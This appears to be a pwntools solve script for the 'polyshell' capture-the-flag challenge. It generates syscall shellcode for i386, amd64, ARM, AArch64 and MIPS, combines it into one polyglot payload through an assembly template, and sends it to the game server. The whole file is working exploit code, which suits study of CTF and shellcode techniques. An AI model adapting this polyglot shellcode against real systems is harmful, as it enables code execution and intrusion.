#!/usr/bin/env python
from pwn import *
import subprocess
context.log_level = 'debug'
r = remote("polyshell-01.play.midnightsunctf.se", 30000)

r.recvuntil("Syscall number: ")
syscall = r.recvuntil("\n")
r.recvuntil("Argument 1: ")
num = r.recvuntil("\n")
r.recvuntil("Argument 2: ")
string = r.recvuntil("\n")

syscall = int(syscall.decode("utf-8"))
num = int(num.decode("utf-8"))
string = string.decode("utf-8").split()[-1].strip('"')

context.bits = 32
context.arch = 'i386'
i386_asm = shellcraft.i386.pushstr(string) + shellcraft.i386.linux.syscall(syscall, num, 'esp')
i386_bytes = asm(i386_asm)

context.bits = 64
context.arch = 'amd64'
amd64_asm = shellcraft.amd64.pushstr(string) + shellcraft.amd64.linux.syscall(syscall, num, 'rsp')
amd64_bytes = asm(amd64_asm)

context.arch = 'arm'
arm_asm = shellcraft.arm.pushstr(string) + shellcraft.arm.linux.syscall(syscall, num, 'sp')
arm_bytes = asm(arm_asm)

context.arch = 'aarch64'
arm64_asm = shellcraft.aarch64.pushstr(string) + shellcraft.aarch64.linux.syscall(syscall, num, 'sp')
arm64_bytes = asm(arm64_asm)

context.arch = 'mips'
mips_asm = shellcraft.mips.pushstr(string) + shellcraft.mips.linux.syscall(syscall, num, '$sp')
mips_bytes = asm(mips_asm)

with open("template.asm") as f:
    asm_template = f.read()

asm_final = asm_template.format(", ".join(map(hex, mips_bytes)),
                                ", ".join(map(hex, i386_bytes)),
                                ", ".join(map(hex, amd64_bytes)),
                                ", ".join(map(hex, arm_bytes)),
                                ", ".join(map(hex, arm64_bytes)))

with open("gen.asm", "w") as f:
    f.write(asm_final)

subprocess.call(["nasm", "gen.asm"])

with open("gen", "rb") as f:
    payload = f.read()

print(syscall, num, string)

r.recvuntil("Your shellcode:")
r.sendline(enhex(payload))

r.interactive()
